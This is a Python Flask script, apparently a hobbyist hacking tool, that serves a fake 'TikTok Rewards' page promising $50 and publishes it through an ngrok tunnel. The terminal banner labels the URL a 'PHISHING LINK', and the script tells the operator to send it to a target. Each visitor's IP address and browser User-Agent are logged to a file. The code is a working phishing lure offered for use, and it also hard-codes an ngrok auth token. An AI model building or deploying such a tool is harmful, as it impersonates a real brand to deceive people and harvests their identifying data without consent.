import os
import time
import sys
from flask import Flask, request, render_template_string
from pyngrok import ngrok

# --- NEXO-TECH COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

app = Flask(__name__)

# --- CONFIGURATION ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF" # <--- PASTE YOUR TOKEN HERE
PORT = 8080

def show_banner(link="GENERATING..."):
    os.system('clear')
    print(f"{C}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(f" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_{W}")
    print(f"{G}======================================================={W}")
    print(f"{Y}  PHISHING LINK: {W}{link}")
    print(f"{Y}  STATUS:        {G}[ LISTENING FOR TARGETS ]{W}")
    print(f"{G}======================================================={W}\n")

# --- THE PHISHING PAGE (TikTok Reward Fake) ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TikTok Rewards - Claim Your Gift</title>
    <style>
        body { background: black; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #ff0050; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <img src="https://logodownload.org" width="100">
    <h1>Congratulations!</h1>
    <p>You have been selected for a TikTok Creator Reward.</p>
    <button class="btn">CLAIM $50 REWARD</button>
</body>
</html>
"""

@app.route('/')
def trap():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # ALERT IN TERMINAL
    print(f"\n{R}[!] TARGET HIT!{W}")
    print(f"{G}[+] IP: {Y}{user_ip}{W}")
    print(f"{G}[+] OS: {W}{user_agent[:50]}...")

    with open("captured_data.txt", "a") as f:
        f.write(f"IP: {user_ip} | UA: {user_agent}\n")

    return render_template_string(HTML_PAGE)

if __name__ == "__main__":
    # Initialize Ngrok
    try:
        ngrok.set_auth_token(NGROK_TOKEN)
        public_url = ngrok.connect(PORT).public_url
        show_banner(public_url)
    except Exception as e:
        print(f"{R}[-] Ngrok Error: {e}{W}")
        sys.exit()

    print(f"{C}[*] Send the link above to your target.{W}")
    print(f"{Y}[*] Captured data will be saved to 'captured_data.txt'{W}\n")
    
    app.run(port=PORT)
